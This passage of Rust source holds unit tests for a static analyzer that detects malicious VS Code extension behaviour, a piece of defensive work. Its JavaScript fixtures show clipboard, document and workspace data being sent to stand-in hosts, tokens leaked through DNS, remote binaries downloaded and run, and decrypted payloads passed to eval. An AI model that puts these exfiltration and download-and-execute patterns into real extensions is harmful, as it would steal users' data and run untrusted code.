    if (now(l) && fixed(r)) || (now(r) && fixed(l)) {
        let (line, col) = cx.pos(n.start_byte());
        return Some(Hit {
            vector: "ext/time-bomb",
            message: format!("behaviour gated on a fixed date (`{}`)", cx.short(n, 80)),
            line,
            col,
            source: None,
            confidence: 0.6,
        });
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn vectors(src: &str) -> Vec<&'static str> {
        let mut v: Vec<_> = analyze(src.as_bytes()).into_iter().map(|h| h.vector).collect();
        v.sort();
        v.dedup();
        v
    }

    #[test]
    fn clipboard_to_network() {
        let src = r#"const vscode = require("vscode"); const https = require("https");
            async function f() { const t = await vscode.env.clipboard.readText(); const body = JSON.stringify({ t });
              const req = https.request("https://c.example/x", { method: "POST" }); req.write(body); }"#;
        assert_eq!(vectors(src), vec!["ext/clipboard-exfil"]);
        let h = analyze(src.as_bytes()).into_iter().find(|h| h.vector == "ext/clipboard-exfil").unwrap();
        assert_eq!(h.line, 3);
        assert_eq!(h.source.unwrap().0, 2);
    }

    #[test]
    fn scopes_keep_reused_names_apart() {
        // `t` holds clipboard text in one function and a constant in another (minified bundles).
        let src = r#"function a(e){ const t = e.env.clipboard.readText(); console.debug(1); }
            function b(){ const t = "hello"; fetch("https://x.example", { body: t }); }"#;
        assert!(vectors(src).is_empty(), "{:?}", vectors(src));
    }

    #[test]
    fn document_and_webview_callbacks() {
        let src = r#"const cp = require("child_process");
            ws.onDidChangeTextDocument(ev => { fetch("https://x.example/c", { method: "POST", body: ev.document.uri.toString() }); });
            panel.webview.onDidReceiveMessage(m => { cp.exec(m.command); });"#;
        assert_eq!(vectors(src), vec!["ext/document-exfil", "ext/webview-message-exec"]);
    }

    #[test]
    fn block_scopes_and_process_streams() {
        // An inner `let t` in a block must not leak into the outer parameter `t`; a process
        // stream's onDidReceiveMessage is not a webview.
        let src = r#"const cp = require("child_process");
            async function run({ args: t }) { try { let t = ""; panel.webview.onDidReceiveMessage(e => { t += e; }); } finally {} cp.spawn("node", t); }
            proc.stderr.onDidReceiveMessage(m => { cp.exec(m); });"#;
        assert!(vectors(src).is_empty(), "{:?}", vectors(src));
        let leak = r#"const cp = require("child_process");
            function run() { let t = ""; panel.webview.onDidReceiveMessage(e => { t += e; }); for (const x of [t]) { cp.spawn("node", [x]); } }"#;
        assert_eq!(vectors(leak), vec!["ext/webview-message-exec"]);
    }

    #[test]
    fn download_then_execute() {
        let src = r#"const https = require("https"), fs = require("fs"), { spawn } = require("child_process");
            const p = "/tmp/u";
            https.get("https://x.example/a", res => { const f = p + "/bin"; res.pipe(fs.createWriteStream(f)); res.on("end", () => { fs.chmodSync(f, 0o755); spawn(f); }); });"#;
        assert_eq!(vectors(src), vec!["ext/download-exec"]);
        let safe = r#"const https = require("https"), fs = require("fs");
            https.get("https://x.example/a.json", res => { res.pipe(fs.createWriteStream("/tmp/cache.json")); });"#;
        assert!(vectors(safe).is_empty());
    }

    #[test]
    fn decrypt_eval_and_encoded_url() {
        let src = r#"const c = require("crypto"); const d = c.createDecipheriv("aes-256-cbc", k, iv); let out = d.update(blob, "base64", "utf8"); out += d.final("utf8"); eval(out);
            const host = Buffer.from("ZXZpbC5leGFtcGxl", "base64").toString(); fetch("https://" + host + "/x");"#;
        assert_eq!(vectors(src), vec!["ext/encoded-url", "ext/encrypted-payload"]);
        assert!(vectors(r#"fetch("https://x.example", { body: atob(s) })"#).is_empty(), "decoded body is not an encoded URL");
    }

    #[test]
    fn secrets_storage_dns_and_workspace() {
        let src = r#"const dns = require("dns"); const fs = require("fs"); const { execSync } = require("child_process");
            async function activate(ctx) {
              const tok = await ctx.secrets.get("token"); console.log(tok);
              const files = await vscode.workspace.findFiles("**/*"); fetch("https://x.example", { method: "POST", body: JSON.stringify(files) });
              dns.lookup(`${tok}.x.example`, () => {});
              const p = ctx.globalStorageUri.fsPath + "/p.js"; fs.writeFileSync(p, code); require(p);
            }"#;
        assert_eq!(vectors(src), vec!["ext/dns-exfil", "ext/secret-storage-abuse", "ext/storage-payload", "ext/workspace-harvest"]);
    }

    #[test]
    fn syntactic_checks() {
        let src = r#"exports.activate = function (ctx) { vscode.env.openExternal(vscode.Uri.parse("https://x.example")); ctx.subscriptions.push(cmd(() => vscode.env.openExternal(u))); };
            if (Date.now() > 1893456000000) { run(); }
            const k = "q8X2mZ7vR1pL9sT4wY6eA3nB5cD0fG8hJ2kM4oP6rS9uV1xZ3bN5dF7gH9jK1lQ3wE5rT7yU9iO1pA3sD5fG7hJ9kL2zX4cV6bN8mQ0wE2rT4yU6iO8pA0sD2fG4h";
            if (new Date() < new Date("2020-01-01")) {}"#;
        let hits = analyze(src.as_bytes());
        let v: Vec<_> = hits.iter().map(|h| h.vector).collect();
        assert_eq!(v.iter().filter(|x| **x == "ext/open-external-startup").count(), 1, "only the direct call in activate");
        assert_eq!(v.iter().filter(|x| **x == "ext/time-bomb").count(), 2);
        assert!(v.contains(&"ext/high-entropy-string"));
        assert!(vectors(r#"const svg = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg_iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB";"#).is_empty());
    }
}
